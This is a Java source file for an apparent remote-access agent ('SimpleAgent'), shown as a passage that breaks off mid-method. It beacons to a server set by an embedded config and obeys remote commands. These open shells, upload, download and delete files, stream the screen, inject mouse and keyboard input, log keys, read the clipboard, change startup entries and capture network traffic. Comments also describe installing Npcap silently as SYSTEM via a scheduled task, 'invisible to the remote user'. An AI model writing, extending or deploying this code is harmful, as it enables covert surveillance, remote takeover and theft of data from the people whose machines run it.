/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.webaon.simpleserver;
import org.json.JSONObject;
import org.json.JSONArray;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.zip.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.util.List;            // explicit — resolves ambiguity with java.awt.List
import java.sql.Timestamp;
import org.pcap4j.core.*;
import org.pcap4j.packet.*;
import javax.imageio.*;
import javax.imageio.stream.*;
/**
 *
 * @author Zahid Wadiwale
 */
public class SimpleAgent {
    private static final Map<String, OutputStream> openFiles = new ConcurrentHashMap<>();
    private static PrintWriter socketOut;

    // persistent shell sessions keyed by sessionId
    private static final Map<String, Process>     shellProcesses = new ConcurrentHashMap<>();
    private static final Map<String, PrintWriter> shellWriters   = new ConcurrentHashMap<>();

    // screen-capture sessions keyed by sessionId → capture thread
    private static final Map<String, Thread> screenSessions = new ConcurrentHashMap<>();

    // shared Robot instance (null on headless / Android / unsupported OS)
    private static volatile Robot robotInstance;
    private static Robot getRobot() {
        if (robotInstance == null) {
            synchronized (SimpleAgent.class) {
                if (robotInstance == null) {
                    try {
                        robotInstance = new Robot();
                        robotInstance.setAutoDelay(0);
                        robotInstance.setAutoWaitForIdle(false);
                    } catch (Exception ignored) {}
                }
            }
        }
        return robotInstance;
    }
    public static void main(String[] args) {
        // Defaults — overridden by aon.properties embedded in the JAR by Client Generator
        String host = "127.0.0.1";
        int port = 5555;
        try (java.io.InputStream cfg =
                SimpleAgent.class.getResourceAsStream("/aon.properties")) {
            if (cfg != null) {
                java.util.Properties p = new java.util.Properties();
                p.load(cfg);
                host = p.getProperty("host", host);
                port = Integer.parseInt(p.getProperty("port", String.valueOf(port)));
            }
        } catch (Exception ignored) {}

        // one-time info
        String clientName = "MyTestClient";
        String osName = System.getProperty("os.name");
        String osType = detectOsType(osName); // see below
        String pcName = System.getenv("COMPUTERNAME");
        if (pcName == null) pcName = System.getenv("HOSTNAME");

        while (true) {
            try {
                runClientOnce(host, port, osType, osName, pcName, clientName);
            } catch (Exception e) {
                System.out.println("Connection lost, retrying in 5s...");
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            }
        }
    }
     private static void runClientOnce(String host, int port,
                                      String osType, String osName, String pcName, String clientName) throws Exception {

        Socket socket = new Socket(host, port);
        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
        socketOut = new PrintWriter(socket.getOutputStream(), true);

        System.out.println("Connected to server");

        out.println("HANDSHAKE|" + osType + "|" + osName + "|" + pcName + "|" + clientName);

        System.out.println("Server: " + in.readLine());
        final boolean[] running = {true};

        // start reader
        Thread reader = new Thread(() -> {
            try {
                handleServer(in, out);
            } catch (IOException e) {
                System.out.println("Reader ended: " + e);
            } finally {
                running[0] = false;
                try { socket.close(); } catch (IOException ignored) {}
            }
        });
        reader.start();

        // ping loop – exit on any error
        try {
            while (running[0]) {
                out.println("PING");
                Thread.sleep(5000);
                if (socket.isClosed() || !socket.isConnected()) break;
            }
        } finally {
            try { socket.close(); } catch (IOException ignored) {}
        }
    }
    private static String detectOsType(String osName) {
        osName = osName.toLowerCase();
        if (osName.contains("win")) return "Windows";
        if (osName.contains("mac")) return "Mac OS";
        if (osName.contains("nux") || osName.contains("nix")) return "Linux";
        if (osName.contains("android")) return "Android";
        if (osName.contains("ios")) return "iOS";
        // add Harmony OS detection if you need
        return "Unknown";
    }
    private static void handleServer(BufferedReader in, PrintWriter out) throws IOException {
                        String line;
                        while ((line = in.readLine()) != null) {
                            System.out.println("Command from server: " + line);
                            if (line == null) break;
                            if (line.startsWith("{") && line.endsWith("}")) {
                                try {
                                    JSONObject msg = new JSONObject(line);
                                    handleIncoming(msg);
                                } catch (Exception ex) {
                                    System.err.println("Invalid JSON: " + ex);
                                }
                                continue;
                            }
                            if (line.startsWith("LIST|")) {
                                String path = line.substring(5);
                                File dir = new File(path);
                                if (!dir.exists() || !dir.isDirectory()) {
                                    out.println("FILES|ERROR: Path not found");
                                    continue;
                                }
                                File[] files = dir.listFiles();
                                if (files == null) files = new File[0];

                                final int MAX_CHARS = 4000; // safe for TCP + readLine()
                                StringBuilder sb = new StringBuilder();
                                out.println("FILES_BEGIN");
                                for (File f : files) {
                                    String name = f.getName();
                                    if (f.isDirectory()) name += "/";
                                    long size = f.isDirectory() ? 0 : f.length();
                                    long modified = f.lastModified();
                                    String SEP = "/$#*,*#$/";
                                    String entry = name + SEP + size + SEP + modified + ";";
                                    // if adding this entry exceeds limit → send chunk now
                                    if (sb.length() + entry.length() > MAX_CHARS) {
                                        out.println("FILES_CHUNK|" + sb);
                                        sb.setLength(0);
                                    }
                                    sb.append(entry);
                                }
                                // send remaining items
                                if (sb.length() > 0) {
                                    out.println("FILES_CHUNK|" + sb);
                                }
                                out.println("FILES_DONE");
                            } else if (line.equals("LIST_ROOTS")) {
                                StringBuilder sb = new StringBuilder("ROOTS|");
                                for (File root : File.listRoots()) {
                                    sb.append(root.getAbsolutePath()).append(';');
                                }
                                out.println(sb.toString());
                            }else {
                                // default keep-alive or ping logic
                                System.out.println("Server: " + line);
                            }
                        }
                         throw new IOException("Server closed connection");
    }
    // === UPLOAD HANDLERS ===

    private static void handleIncoming(JSONObject msg) throws IOException {
        String cmd = msg.getString("cmd");
        switch (cmd) {
            case "fs:mkdir":
                createDir(msg.getString("path"));
                break;
            case "fs:upload_start":
                startUpload(msg.getString("path"));
                break;
            case "fs:upload_chunk":
                appendChunk(msg.getString("path"), msg.getString("data"));
                break;
            case "fs:upload_finish":
                finishUpload(msg.getString("path"));
                break;
            case "fs:download_start":
                handleDownloadStart(msg);
                break;
            case "fs:delete":
                handleDelete(msg);
                break;
            case "fs:rename":
                handleRename(msg);
                break;
            case "fs:find":
                handleFind(msg);
                break;
            case "shell":
                handleShell(msg);
                break;
            case "fs:read_file":
                handleReadFile(msg);
                break;
            case "fs:zip":
                handleZip(msg);
                break;
            case "fs:extract":
                handleExtract(msg);
                break;
            case "shell:start":
                handleShellStart(msg);
                break;
            case "shell:input":
                handleShellInput(msg);
                break;
            case "shell:stop":
                handleShellStop(msg);
                break;
            // ── screen capture ──────────────────────────────────────────────
            case "screen:start":
                handleScreenStart(msg);
                break;
            case "screen:stop":
                handleScreenStop(msg);
                break;
            // ── robot input ─────────────────────────────────────────────────
            case "input:mouse_move":
                handleMouseMove(msg);
                break;
            case "input:mouse_press":
                handleMousePress(msg);
                break;
            case "input:mouse_release":
                handleMouseRelease(msg);
                break;
            case "input:mouse_scroll":
                handleMouseScroll(msg);
                break;
            case "input:key_press":
                handleKeyPress(msg);
                break;
            case "input:key_release":
                handleKeyRelease(msg);
                break;
            // ── network controls ─────────────────────────────────────────────
            case "net:capture_start":   handleCaptureStart(msg);    break;
            case "net:capture_stop":    handleCaptureStop(msg);     break;
            case "net:hosts_read":      handleHostsRead(msg);       break;
            case "net:hosts_write":     handleHostsWrite(msg);      break;
            case "net:interfaces_list": handleInterfacesList(msg);  break;
            // ── others tab ───────────────────────────────────────────────────
            case "sys:info":     handleSysInfo(msg);    break;
            case "proc:list":    handleProcList(msg);   break;
            case "proc:kill":    handleProcKill(msg);   break;
            case "clip:get":     handleClipGet(msg);    break;
            case "clip:set":     handleClipSet(msg);    break;
            case "key:start":    handleKeyStart(msg);   break;
            case "key:stop":     handleKeyStop(msg);    break;
            // ── advanced tab ─────────────────────────────────────────────────
            case "power:action":     handlePowerAction(msg);    break;
            case "startup:list":     handleStartupList(msg);    break;
            case "startup:add":      handleStartupAdd(msg);     break;
            case "startup:remove":   handleStartupRemove(msg);  break;
            case "msgbox:show":      handleMsgBox(msg);         break;
        }
    }

    private static void createDir(String path) throws IOException {
        Path p = mapToLocalPath(path);
        Files.createDirectories(p);
        System.out.println("Created directory " + p);
    }

    private static void startUpload(String path) throws IOException {
        Path p = mapToLocalPath(path);
        Files.createDirectories(p.getParent());
        OutputStream out = new BufferedOutputStream(Files.newOutputStream(p));
        openFiles.put(path, out);
        System.out.println("Started upload for " + p);
    }

    private static void appendChunk(String path, String base64) throws IOException {
        OutputStream out = openFiles.get(path);
        if (out == null) throw new IOException("No open file for " + path);
        byte[] bytes = Base64.getDecoder().decode(base64);
        out.write(bytes);
    }

    private static void finishUpload(String path) throws IOException {
        OutputStream out = openFiles.remove(path);
        if (out != null) {
            out.close();
            System.out.println("Finished upload for " + path);
        }
    }
    
    private static void handleDownloadStart(JSONObject msg) throws IOException {
        String path = msg.getString("path");
        String dest = msg.optString("dest", ""); // destination path on client side
        File file = new File(path);
        String transferId = msg.optString("transferId", UUID.randomUUID().toString()); // keep original

        // acknowledge
        JSONObject ack = new JSONObject();
        ack.put("cmd", "fs:download_start_ack");
        ack.put("path", path);
        ack.put("size", file.isFile() ? file.length() : 0);
        ack.put("transferId", transferId);
        send(ack);

        if (file.isDirectory()) {
            Path base = file.toPath();

            Files.walk(base).forEach(p -> {
                try {
                    Path relative = base.relativize(p);
                    String relativePath = relative.toString().replace(File.separatorChar, '/'); // normalize
                    String target = dest + "/" + relativePath;

                    if (Files.isDirectory(p)) {
                        // Tell server to create a directory
                        JSONObject dirMsg = new JSONObject();
                        dirMsg.put("cmd", "fs:download_mkdir");
                        dirMsg.put("path", p.toString());
                        dirMsg.put("localPath", target);
                        dirMsg.put("transferId", transferId);
                        send(dirMsg);
                    } else {
                        // Send file chunks like before
                        try (InputStream in = new BufferedInputStream(Files.newInputStream(p))) {
                            byte[] buf = new byte[8192];
                            int len;
                            while ((len = in.read(buf)) != -1) {
                                String base64 = Base64.getEncoder().encodeToString(Arrays.copyOf(buf, len));
                                JSONObject chunk = new JSONObject();
                                chunk.put("cmd", "fs:download_chunk");
                                chunk.put("path", p.toString());
                                chunk.put("data", base64);
                                chunk.put("size", Files.size(p));
                                chunk.put("localPath", target);
                                chunk.put("transferId", transferId);
                                send(chunk);
                            }
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            });
            JSONObject finish = new JSONObject();
            finish.put("cmd", "fs:download_finish");
            finish.put("path", path);
            finish.put("transferId", transferId);
            send(finish);
            return;
        }

        try (InputStream in = new BufferedInputStream(new FileInputStream(file))) {
            byte[] buf = new byte[8192];
            int len;
            while ((len = in.read(buf)) != -1) {
                String base64 = Base64.getEncoder().encodeToString(Arrays.copyOf(buf, len));

                JSONObject chunk = new JSONObject();
                chunk.put("cmd", "fs:download_chunk");
                chunk.put("path", path);
                chunk.put("data", base64);
                chunk.put("size", file.length());
                chunk.put("localPath", dest + "/" + file.getName());
                send(chunk);
            }
        }

        JSONObject finish = new JSONObject();
        finish.put("cmd", "fs:download_finish");
        finish.put("path", path);
        send(finish);
    }
    
    private static void send(JSONObject msg) {
        socketOut.println(msg.toString());
    }

    private static void sendStatus(String message) {
        JSONObject s = new JSONObject();
        s.put("cmd", "net:status");
        s.put("message", message);
        send(s);
    }

    private static Path mapToLocalPath(String remotePath) {
        // base directory where all uploads go on this agent
        //String base = getAgentBaseDirectory();
        String osPath = remotePath.replace('/', File.separatorChar);
        // This allows absolute paths like C:\foo\bar on Windows or /home/user/foo on Linux/Mac
        Path p = Paths.get(osPath);
        // make sure parent directories exist
        try {
            Files.createDirectories(p.getParent());
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }

        return p;
    }

    private static String getAgentBaseDirectory() {
        // e.g. store all uploads in user's home under "AonUploads"
        return System.getProperty("user.home") + File.separator + "AonUploads";
    }

    // === PERSISTENT SHELL SESSIONS ===

    private static void handleShellStart(JSONObject msg) {
        String sessionId = msg.getString("sessionId");
        try {
            String os = System.getProperty("os.name").toLowerCase();
            ProcessBuilder pb = os.contains("win")
                ? new ProcessBuilder("cmd.exe")
                : new ProcessBuilder("bash", "--login");
            pb.redirectErrorStream(true);
            Process proc = pb.start();
            shellProcesses.put(sessionId, proc);

            PrintWriter writer = new PrintWriter(
                new BufferedWriter(new OutputStreamWriter(proc.getOutputStream())), true);
            shellWriters.put(sessionId, writer);

            // stream stdout back to the server in a dedicated thread
            Thread outputThread = new Thread(() -> {
                byte[] buf = new byte[512];
                try (InputStream is = proc.getInputStream()) {
                    int len;
                    while ((len = is.read(buf)) != -1) {
                        String chunk = new String(buf, 0, len);
                        JSONObject out = new JSONObject();
                        out.put("cmd", "shell:output");
                        out.put("sessionId", sessionId);
                        out.put("data", chunk);
                        send(out);
                    }
                } catch (IOException ignored) {}
                // notify server that the shell has exited
                shellProcesses.remove(sessionId);
                shellWriters.remove(sessionId);
                JSONObject ended = new JSONObject();
                ended.put("cmd", "shell:ended");
                ended.put("sessionId", sessionId);
                send(ended);
            }, "shell-out-" + sessionId);
            outputThread.setDaemon(true);
            outputThread.start();

            JSONObject ack = new JSONObject();
            ack.put("cmd", "shell:started");
            ack.put("sessionId", sessionId);
            send(ack);
        } catch (IOException e) {
            JSONObject err = new JSONObject();
            err.put("cmd", "shell:error");
            err.put("sessionId", sessionId);
            err.put("error", e.getMessage());
            send(err);
        }
    }

    private static void handleShellInput(JSONObject msg) {
        String sessionId = msg.getString("sessionId");
        String data = msg.getString("data");
        PrintWriter writer = shellWriters.get(sessionId);
        if (writer != null) {
            writer.println(data);
            writer.flush();
        }
    }

    private static void handleShellStop(JSONObject msg) {
        String sessionId = msg.getString("sessionId");
        Process proc = shellProcesses.remove(sessionId);
        shellWriters.remove(sessionId);
        if (proc != null && proc.isAlive()) {
            proc.destroyForcibly();
        }
    }

    // === DELETE ===

    private static void handleDelete(JSONObject msg) {
        String path = msg.getString("path");
        JSONObject result = new JSONObject();
        result.put("cmd", "fs:delete_result");
        result.put("path", path);
        try {
            Path p = Paths.get(path);
            if (Files.exists(p)) {
                deleteRecursive(p);
                result.put("success", true);
            } else {
                result.put("success", false);
                result.put("error", "Path not found: " + path);
            }
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        send(result);
    }

    private static void deleteRecursive(Path path) throws IOException {
        if (Files.isDirectory(path)) {
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(path)) {
                for (Path entry : stream) {
                    deleteRecursive(entry);
                }
            }
        }
        Files.delete(path);
    }

    // === RENAME ===

    private static void handleRename(JSONObject msg) {
        String from = msg.getString("from");
        String to = msg.getString("to");
        JSONObject result = new JSONObject();
        result.put("cmd", "fs:rename_result");
        result.put("from", from);
        result.put("to", to);
        try {
            Files.move(Paths.get(from), Paths.get(to));
            result.put("success", true);
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        send(result);
    }

    // === FIND ===

    private static void handleFind(JSONObject msg) {
        String basePath = msg.getString("path");
        String query = msg.optString("query", "").toLowerCase();
        JSONObject result = new JSONObject();
        result.put("cmd", "fs:find_result");
        result.put("query", query);
        JSONArray found = new JSONArray();
        try {
            Files.walk(Paths.get(basePath))
                 .filter(p -> p.getFileName().toString().toLowerCase().contains(query))
                 .limit(500)
                 .forEach(p -> found.put(p.toString()));
        } catch (IOException e) {
            // return whatever partial results were found
        }
        result.put("files", found);
        send(result);
    }

    // === SHELL COMMAND ===

    private static void handleShell(JSONObject msg) {
        String command = msg.getString("command");
        JSONObject result = new JSONObject();
        result.put("cmd", "shell_result");
        result.put("command", command);
        try {
            String os = System.getProperty("os.name").toLowerCase();
            ProcessBuilder pb = os.contains("win")
                ? new ProcessBuilder("cmd.exe", "/c", command)
                : new ProcessBuilder("sh", "-c", command);
            pb.redirectErrorStream(true);
            Process proc = pb.start();

            StringBuilder output = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            boolean finished = proc.waitFor(30, TimeUnit.SECONDS);
            int exitCode;
            if (!finished) {
                proc.destroyForcibly();
                output.append("\n[Command timed out after 30 seconds]");
                exitCode = -1;
            } else {
                exitCode = proc.exitValue();
            }
            result.put("output", output.toString());
            result.put("exitCode", exitCode);
            result.put("success", true);
        } catch (Exception e) {
            result.put("success", false);
            result.put("output", "Error: " + e.getMessage());
            result.put("exitCode", -1);
        }
        send(result);
    }

    // === READ FILE (for view/edit) ===

    private static void handleReadFile(JSONObject msg) {
        String path = msg.getString("path");
        String transferId = msg.optString("transferId", UUID.randomUUID().toString());
        File file = new File(path);
        if (!file.exists() || !file.isFile()) {
            JSONObject err = new JSONObject();
            err.put("cmd", "fs:file_error");
            err.put("transferId", transferId);
            err.put("error", "File not found or is a directory");
            send(err);
            return;
        }
        try (InputStream in = new BufferedInputStream(new FileInputStream(file))) {
            byte[] buf = new byte[8192];
            int len;
            while ((len = in.read(buf)) != -1) {
                String base64 = Base64.getEncoder().encodeToString(Arrays.copyOf(buf, len));
                JSONObject chunk = new JSONObject();
                chunk.put("cmd", "fs:file_chunk");
                chunk.put("transferId", transferId);
                chunk.put("data", base64);
                send(chunk);
            }
            JSONObject done = new JSONObject();
            done.put("cmd", "fs:file_done");
            done.put("transferId", transferId);
            done.put("path", path);
            send(done);
        } catch (Exception e) {
            JSONObject err = new JSONObject();
            err.put("cmd", "fs:file_error");
            err.put("transferId", transferId);
            err.put("error", e.getMessage());
            send(err);
        }
    }

    // === ZIP ===

    private static void handleZip(JSONObject msg) {
        String sourcePath = msg.getString("path");
        String destPath = msg.getString("dest");
        JSONObject result = new JSONObject();
        result.put("cmd", "fs:zip_result");
        result.put("path", destPath);
        try {
            Path source = Paths.get(sourcePath);
            try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(destPath))) {
                if (Files.isDirectory(source)) {
                    Files.walk(source).filter(p -> !Files.isDirectory(p)).forEach(p -> {
                        try {
                            String entryName = source.relativize(p).toString().replace(File.separatorChar, '/');
                            zos.putNextEntry(new ZipEntry(entryName));
                            Files.copy(p, zos);
                            zos.closeEntry();
                        } catch (IOException e) {
                            throw new UncheckedIOException(e);
                        }
                    });
                } else {
                    zos.putNextEntry(new ZipEntry(source.getFileName().toString()));
                    Files.copy(source, zos);
                    zos.closeEntry();
                }
            }
            result.put("success", true);
        } catch (Exception e) {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        send(result);
    }

    // === NETWORK CONTROLS (Pcap4J — bundled in fat JAR) ===

    // Keyed by sessionId; PcapHandle.close() stops the capture loop.
    private static final Map<String, PcapHandle> captureSessions = new ConcurrentHashMap<>();
    private static volatile boolean nativeLibChecked = false;

    private static void handleCaptureStart(JSONObject msg) {
        String sessionId  = msg.getString("sessionId");
        String userFilter = msg.optString("filter", "");
        String serverIp   = msg.optString("serverIp", "");
        int    serverPort = msg.optInt("serverPort", 5555);

        Thread t = new Thread(() -> {
            PcapHandle handle = null;
            try {
                String os = System.getProperty("os.name").toLowerCase();

                // 1. Make sure the native library is present; install it if not
                ensureNativeLibrary(os);

                // 2. Build BPF exclusion filter (server's own traffic is invisible)
                String selfEx = serverIp.isEmpty() ? ""
                        : "not (host " + serverIp + " and port " + serverPort + ")";
                String bpf = selfEx.isEmpty()     ? userFilter
                           : userFilter.isEmpty() ? selfEx
                           : selfEx + " and (" + userFilter + ")";

                // 3. Pick the best capture interface
                PcapNetworkInterface nif = selectBestInterface(os);
                if (nif == null) throw new RuntimeException("No usable network interface found.");

                // 4. Open handle (65536-byte snap, promiscuous, 50 ms read timeout)
                handle = nif.openLive(65536,
                        PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 50);

                if (!bpf.isEmpty()) {
                    try {
                        handle.setFilter(bpf, BpfProgram.BpfCompileMode.OPTIMIZE);
                    } catch (Exception ex) {
                        System.err.println("[Pcap4J] BPF filter error (ignored): " + ex.getMessage());
                    }
                }

                captureSessions.put(sessionId, handle);

                JSONObject started = new JSONObject();
                started.put("cmd", "net:capture_started");
                started.put("sessionId", sessionId);
                send(started);

                // 5. Capture loop — getNextPacketEx() with 50 ms timeout lets us poll
                //    captureSessions so stopCapture (which removes the key) terminates cleanly.
                final PcapHandle fh = handle;
                while (captureSessions.containsKey(sessionId)) {
                    try {
                        Packet packet = fh.getNextPacketEx();
                        Timestamp ts  = fh.getTimestamp();
                        JSONObject pkt = extractPacket(packet, ts);
                        if (pkt != null) {
                            pkt.put("cmd",       "net:packet");
                            pkt.put("sessionId", sessionId);
                            send(pkt);
                        }
                    } catch (TimeoutException ignored) {
                        // no packet in the 50 ms window — loop back and check key
                    } catch (NotOpenException | EOFException e) {
                        break; // handle closed by stopCapture
                    }
                }

            } catch (PcapNativeException e) {
                String msg2 = e.getMessage() == null ? "" : e.getMessage();
                String hint = "";
                String os2  = System.getProperty("os.name").toLowerCase();
                if (msg2.toLowerCase().contains("permission")
                        || msg2.toLowerCase().contains("denied")) {
                    if (os2.contains("linux"))
                        hint = " → Run as root or: sudo setcap cap_net_raw,cap_net_admin+eip $(which java)";
                    else if (os2.contains("mac"))
                        hint = " → Run as root: sudo java -jar SimpleServer.jar";
                    else
                        hint = " → Run as Administrator";
                }
                JSONObject err = new JSONObject();
                err.put("cmd", "net:error"); err.put("op", "capture");
                err.put("error", msg2 + hint);
                send(err);
            } catch (Exception e) {
                JSONObject err = new JSONObject();
                err.put("cmd", "net:error"); err.put("op", "capture");
                err.put("error", e.getMessage() != null ? e.getMessage() : e.getClass().getName());
                send(err);
            } catch (Error e) {
                // Catches NoClassDefFoundError when NativeMappings was poisoned earlier in
                // this JVM session (wpcap.dll was absent on first access).
                JSONObject err = new JSONObject();
                err.put("cmd", "net:error"); err.put("op", "capture");
                String detail = (e.getMessage() != null && e.getMessage().contains("NativeMappings"))
                    ? "Npcap/wpcap.dll is not loaded in this JVM session. "
                      + "Restart SimpleServer.jar (Npcap should now be installed) and try again."
                    : e.getClass().getSimpleName() + ": " + e.getMessage();
                err.put("error", detail);
                send(err);
            } finally {
                captureSessions.remove(sessionId);
                if (handle != null) {
                    try { handle.close(); } catch (Exception ignored) {}
                }
                JSONObject ended = new JSONObject();
                ended.put("cmd", "net:capture_ended"); ended.put("sessionId", sessionId);
                send(ended);
            }
        }, "cap-" + sessionId);
        t.setDaemon(true);
        t.start();
    }

    private static void handleCaptureStop(JSONObject msg) {
        String sessionId = msg.getString("sessionId");
        PcapHandle h = captureSessions.remove(sessionId);
        if (h != null) {
            try { h.close(); } catch (Exception ignored) {}
        }
    }

    // ── Native library bootstrap ──────────────────────────────────────────────

    private static void ensureNativeLibrary(String os) throws Exception {
        if (nativeLibChecked) return;

        // IMPORTANT: never call Pcaps.findAllDevs() as a detection probe.
        // If wpcap.dll is absent, NativeMappings.<clinit> throws UnsatisfiedLinkError and
        // the JVM permanently marks that class as failed. Use file-system checks only.

        if (os.contains("win")) {
            String npcapDir = "C:\\Windows\\System32\\Npcap";

            // Tell JNA where to find wpcap.dll BEFORE any Pcap4J class initialization fires.
            // Npcap installs to System32\Npcap\ which is NOT on the default DLL search path.
            String jnaPath = System.getProperty("jna.library.path", "");
            if (!jnaPath.contains(npcapDir)) {
                System.setProperty("jna.library.path",
                    jnaPath.isEmpty() ? npcapDir : npcapDir + ";" + jnaPath);
            }

            String[] knownPaths = {
                npcapDir + "\\wpcap.dll",
                "C:\\Windows\\System32\\wpcap.dll",
                "C:\\Windows\\SysWOW64\\wpcap.dll"
            };
            for (String p : knownPaths) {
                if (new File(p).exists()) { nativeLibChecked = true; return; }
            }
            // Not installed — silently install via Windows Task Scheduler as SYSTEM
            // (no UAC prompt, completely invisible to the remote user)
            sendStatus("Installing Npcap silently on remote device…");
            installNpcapWindows(); // blocks until DLL appears on disk, then returns
            nativeLibChecked = true;
            // No restart needed: jna.library.path is already set and NativeMappings has
            // not been touched yet, so the next Pcaps.findAllDevs() call will succeed.

        } else if (os.contains("linux")) {
            // Pre-set JNA search paths so libpcap is found even on non-standard distros
            String jnaPath = System.getProperty("jna.library.path", "");
            String linuxDirs = "/usr/lib/x86_64-linux-gnu:/usr/lib/aarch64-linux-gnu"
                             + ":/usr/lib:/lib:/usr/local/lib:/lib/x86_64-linux-gnu";
            if (!jnaPath.contains("/usr/lib")) {
                System.setProperty("jna.library.path",
                    jnaPath.isEmpty() ? linuxDirs : linuxDirs + ":" + jnaPath);
            }
            String[] linuxPaths = {
                "/usr/lib/x86_64-linux-gnu/libpcap.so.1",
                "/usr/lib/x86_64-linux-gnu/libpcap.so",
                "/usr/lib/aarch64-linux-gnu/libpcap.so.1",
                "/usr/lib/aarch64-linux-gnu/libpcap.so",
                "/usr/lib/libpcap.so.1", "/usr/lib/libpcap.so",
                "/lib/libpcap.so.1",     "/lib/libpcap.so",
                "/usr/local/lib/libpcap.so.1", "/usr/local/lib/libpcap.so",
                "/lib/x86_64-linux-gnu/libpcap.so.1"
            };
            for (String p : linuxPaths) {
                if (new File(p).exists()) { nativeLibChecked = true; return; }
            }
            sendStatus("libpcap not found — installing silently…");
            installLibpcapLinux();
            nativeLibChecked = true;

        } else if (os.contains("mac") || os.contains("darwin")) {
            // Pre-set JNA paths covering Homebrew (Intel + Apple Silicon) and system
            String jnaPath = System.getProperty("jna.library.path", "");
            String macDirs = "/usr/lib:/usr/local/lib:/opt/homebrew/lib"
                           + ":/opt/homebrew/opt/libpcap/lib:/opt/local/lib";
            if (!jnaPath.contains("/usr/lib")) {
                System.setProperty("jna.library.path",
                    jnaPath.isEmpty() ? macDirs : macDirs + ":" + jnaPath);
            }
            installLibpcapMac();
            nativeLibChecked = true;

        } else {
            nativeLibChecked = true;
        }
    }

    private static void installNpcapWindows() throws Exception {
        String[] knownPaths = {
            "C:\\Windows\\System32\\Npcap\\wpcap.dll",
            "C:\\Windows\\System32\\wpcap.dll",
            "C:\\Windows\\SysWOW64\\wpcap.dll"
        };
        for (String p : knownPaths) if (new File(p).exists()) return; // already installed

        // Download Npcap installer to temp dir
        String url = "https://npcap.com/dist/npcap-1.79.exe";
        File installer = new File(System.getProperty("java.io.tmpdir"), "npcap-setup.exe");
        sendStatus("Downloading Npcap installer…");
        try (InputStream in  = new java.net.URL(url).openStream();
             OutputStream out = new FileOutputStream(installer)) {
            byte[] buf = new byte[16384]; int n;
            while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
        }

        // Run installer as SYSTEM via Windows Task Scheduler — no UAC prompt, fully silent.
        // Standard users CAN create/run scheduled tasks; SYSTEM runs without elevation dialogs.
        String taskName = "NpcapAutoInstall";
        String tr = "\"" + installer.getAbsolutePath() + "\" /S /winpcap_mode";
        sendStatus("Running Npcap installer silently…");

        // Create the task (overwrite if it already exists from a previous attempt)
        new ProcessBuilder("schtasks", "/Create",
            "/TN", taskName, "/TR", tr,
            "/SC", "ONCE", "/ST", "00:00", "/RU", "SYSTEM", "/F")
            .redirectErrorStream(true).start().waitFor(15, TimeUnit.SECONDS);

        // Trigger it immediately
        new ProcessBuilder("schtasks", "/Run", "/TN", taskName)
            .redirectErrorStream(true).start().waitFor(5, TimeUnit.SECONDS);

        // Poll until wpcap.dll appears on disk (up to 90 s)
        long deadline = System.currentTimeMillis() + 90_000;
        while (System.currentTimeMillis() < deadline) {
            Thread.sleep(2000);
            for (String p : knownPaths) {
                if (new File(p).exists()) {
                    try { new ProcessBuilder("schtasks", "/Delete", "/TN", taskName, "/F").start(); }
                    catch (Exception ignored) {}
                    sendStatus("Npcap installed — starting capture…");
                    return; // DLL is on disk, jna.library.path is already set → proceed
                }
            }
        }

        try { new ProcessBuilder("schtasks", "/Delete", "/TN", taskName, "/F").start(); }
        catch (Exception ignored) {}
        throw new RuntimeException(
            "Npcap installer ran but wpcap.dll not found after 90 s. "
          + "Check that SimpleServer has permission to create scheduled tasks.");
    }

    private static void installLibpcapLinux() throws Exception {
        // Each entry: { package-manager, args..., package-name }
        // libpcap-dev is tried first on Debian/Ubuntu — it pulls libpcap0.8 as a dependency
        // and is more consistently named across distro versions.
        String[][] packages = {
            {"apt-get","install","-y","libpcap-dev"},
            {"apt-get","install","-y","libpcap0.8"},
            {"apt",    "install","-y","libpcap-dev"},
            {"apt",    "install","-y","libpcap0.8"},
            {"yum",    "install","-y","libpcap-devel"},
            {"yum",    "install","-y","libpcap"},
            {"dnf",    "install","-y","libpcap-devel"},
            {"dnf",    "install","-y","libpcap"},
            {"pacman", "-S","--noconfirm","libpcap"},
            {"zypper", "install","-y","libpcap-devel"},
            {"apk",    "add","libpcap-dev"},
            {"apk",    "add","libpcap"},
        };
        for (String[] cmd : packages) {
            if (!commandExists(cmd[0])) continue;
            // Try with sudo -n (non-interactive, no password prompt) first,
            // then without sudo (works when already running as root).
            for (boolean withSudo : new boolean[]{true, false}) {
                List<String> full = new ArrayList<>();
                if (withSudo) { full.add("sudo"); full.add("-n"); }
                full.addAll(Arrays.asList(cmd));
                try {
                    ProcessBuilder pb = new ProcessBuilder(full).redirectErrorStream(true);
                    // Prevent apt from showing interactive dialogs or pager prompts
                    pb.environment().put("DEBIAN_FRONTEND",         "noninteractive");
                    pb.environment().put("APT_LISTCHANGES_FRONTEND","none");
                    pb.environment().put("APT_LISTBUGS_FRONTEND",   "none");
                    Process p = pb.start();
                    if (p.waitFor(90, TimeUnit.SECONDS) && p.exitValue() == 0) return;
                } catch (Exception ignored) {}
            }
        }
        throw new RuntimeException(
            "Could not auto-install libpcap on this Linux device. "
          + "The agent needs root or passwordless sudo.");
    }

    private static void installLibpcapMac() throws Exception {
        String[] paths = {
            "/usr/lib/libpcap.A.dylib",
            "/usr/lib/libpcap.dylib",
            "/usr/local/lib/libpcap.A.dylib",              // Homebrew Intel
            "/usr/local/lib/libpcap.dylib",
            "/opt/homebrew/lib/libpcap.A.dylib",            // Homebrew Apple Silicon
            "/opt/homebrew/lib/libpcap.dylib",
            "/opt/homebrew/opt/libpcap/lib/libpcap.dylib",
